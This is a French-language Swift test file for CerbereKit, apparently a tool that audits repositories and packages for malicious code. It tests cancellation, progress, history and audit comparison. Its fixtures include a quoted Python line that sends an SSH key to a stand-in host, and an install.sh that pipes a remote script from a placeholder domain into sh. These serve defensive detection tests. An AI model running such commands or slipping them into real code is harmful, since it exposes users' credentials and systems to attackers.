import Foundation
import Testing
@testable import CerbereKit

/// Ce dont l'app Mac a besoin en plus de l'outil en ligne de commande : arrêt, avancement, aperçu de l'envoi,
/// historique et comparaison de deux audits.
struct AppMacTests {
    @Test func auditAnnuleSansLaisserDeQuarantaine() throws {
        let jeu = try Jeu(Jeux.sain)
        defer { jeu.nettoyer() }
        let annulation = Annulation()
        // Arrêt demandé pendant l'audit (ici : au moment où la lecture par IA commencerait).
        #expect(throws: ErreurCerbere.annule) {
            try Audit.auditer(jeu.dossier.path, racine: jeu.racine, annulation: annulation) { regles, _ in
                annulation.annuler()
                return regles
            }
        }
        #expect(((try? FileManager.default.contentsOfDirectory(atPath: jeu.racine.path)) ?? []).isEmpty)
        // Déjà demandé : rien n'est copié.
        #expect(throws: ErreurCerbere.annule) { try Audit.auditer(jeu.dossier.path, racine: jeu.racine, annulation: annulation) }
        // Le moteur d'IA ne lance plus rien.
        #expect(throws: ErreurCerbere.annule) { try ClaudeCLI(annulation: annulation).verifier() }
    }

    @Test func unOutilEnCoursEstInterrompu() throws {
        let annulation = Annulation()
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/bin/sleep")
        p.arguments = ["30"]
        try p.run()
        annulation.suivre(p)
        let debut = Date()
        annulation.annuler()
        p.waitUntilExit()
        #expect(Date().timeIntervalSince(debut) < 5 && annulation.demandee)
    }

    @Test func avancementEtApercuDeLEnvoi() throws {
        let jeu = try Jeu(Jeux.voleur)
        defer { jeu.nettoyer() }
        let moteur = FauxMoteur { question, _ in
            switch question {
            case .lecture: FauxMoteur.json(["constats": [
                FauxMoteur.constat(fichier: "formateur/coeur.py", ligne: 7, extrait: "urllib.request.urlopen('https://collecte.example.invalid/c', data=cle.encode())"),
            ], "notes": "Formateur."])
            case .relecture: FauxMoteur.json(["avis": [["id": "I1", "decision": "garder", "raison": "exact"]]])
            case .synthese: FauxMoteur.json(["resume": "Le paquet envoie la clé SSH."])
            }
        }
        let recus = Recus()
        var apercu: LectureIA.Apercu?
        _ = try Audit.auditer(jeu.dossier.path, racine: jeu.racine, ia: { regles, inventaire in
            apercu = LectureIA.apercu(inventaire, constats: regles.constats)
            return LectureIA.completerOuNoter(regles, inventaire: inventaire, moteur: moteur, suivi: recus.ajouter)
        }, suivi: recus.ajouter)
        // Rien n'a été envoyé pour l'aperçu, et il annonce ce que la lecture a ensuite couvert.
        #expect(apercu?.fichiers == 4 && apercu?.enEntier == 4 && apercu?.lots == 1 && (apercu?.octets ?? 0) > 0)
        let etapes = recus.tout.map(\.etape)
        #expect(etapes == etapes.sorted() && Set(etapes) == Set(Avancement.Etape.allCases))
        let lecture = recus.tout.last { $0.etape == .lecture }
        #expect(lecture?.message == "" && lecture?.fait == 1 && lecture?.total == 1)
        #expect(lecture?.lignes.first?.hasPrefix("Lot 1 lu : ") == true)
    }

    @Test func historiqueEtCleDeCible() throws {
        let racine = FileManager.default.temporaryDirectory.appending(path: "cerbere-essais/\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: racine) }
        func rapport(_ source: String, _ date: TimeInterval) -> Rapport {
            Rapport(cible: Cible(type: .depot, source: source), date: Date(timeIntervalSince1970: date), verdict: .rienDeGrave, resume: "",
                    constats: [], reseau: Reseau(), nonAnalyse: [], couches: Couches(regles: true, ia: false), fichiersAnalyses: 1)
        }
        let ancien = rapport("https://Example.org/auteur/depot.git", 1_000), recent = rapport("https://example.org/auteur/depot/", 2_000)
        for r in [ancien, recent] { try Audit.ecrire(r, dans: Historique.nouveauDossier(cible: r.cible.source, date: r.date, dans: racine)) }
        // Un dossier sans rapport lisible est ignoré.
        try FileManager.default.createDirectory(at: racine.appending(path: "vide"), withIntermediateDirectories: true)
        try Data("{".utf8).write(to: racine.appending(path: "vide/rapport.json"))
        let lus = Historique.lire(dans: racine)
        #expect(lus.map(\.rapport) == [recent, ancien])
        #expect(ancien.cleCible == recent.cleCible && ancien.nomCourt == "auteur/depot")
        // Même cible, même seconde : un autre dossier, rien n'est écrasé.
        #expect(Historique.nouveauDossier(cible: recent.cible.source, date: recent.date, dans: racine) != lus[0].dossier)
        let paquet = rapport("pypi:essai 1.2.0 (essai-1.2.0-py3-none-any.whl, essai-1.2.0.tar.gz)", 0)
        #expect(paquet.cleCible == "pypi:essai" && paquet.nomCourt == "essai 1.2.0")
        #expect(rapport("/Users/moi/Projets/outil", 0).nomCourt == "outil")
    }

    @Test func comparaisonDeDeuxVersions() throws {
        let avant = try Jeu(Jeux.sain)
        defer { avant.nettoyer() }
        // La version suivante ajoute un script qui télécharge et lance du code, et décale le reste d'une ligne.
        var fichiers = Jeux.sain
        fichiers["install.sh"] = "#!/bin/sh\ncurl -fsSL https://charge.example.invalid/install.sh | sh\n"
        fichiers["README.md"] = "\n" + (fichiers["README.md"] ?? "")
        let apres = try Jeu(fichiers)
        defer { apres.nettoyer() }
        let c = Comparaison(ancien: try avant.rapport(), nouveau: try apres.rapport())
        #expect(c.verdictAvant == .rienDeGrave)
        #expect(c.verdictApres == .risque)
        #expect(c.verdictChange)
        #expect(!c.apparus.isEmpty && c.apparus.allSatisfy { $0.fichier == "install.sh" } && c.disparus.isEmpty)
        #expect(c.nouveauxDomaines.map(\.nom) == ["charge.example.invalid"] && c.domainesDisparus.isEmpty)
        let retour = Comparaison(ancien: try apres.rapport(), nouveau: try avant.rapport())
        #expect(retour.disparus.count == c.apparus.count && retour.apparus.isEmpty && retour.domainesDisparus.count == 1)
        #expect(Comparaison(ancien: try avant.rapport(), nouveau: try avant.rapport()).rienNeChange)
    }
}

private final class Recus: @unchecked Sendable {
    private var liste: [Avancement] = []
    private let verrou = NSLock()

    @Sendable func ajouter(_ a: Avancement) {
        verrou.lock()
        liste.append(a)
        verrou.unlock()
    }

    var tout: [Avancement] {
        verrou.lock()
        defer { verrou.unlock() }
        return liste
    }
}
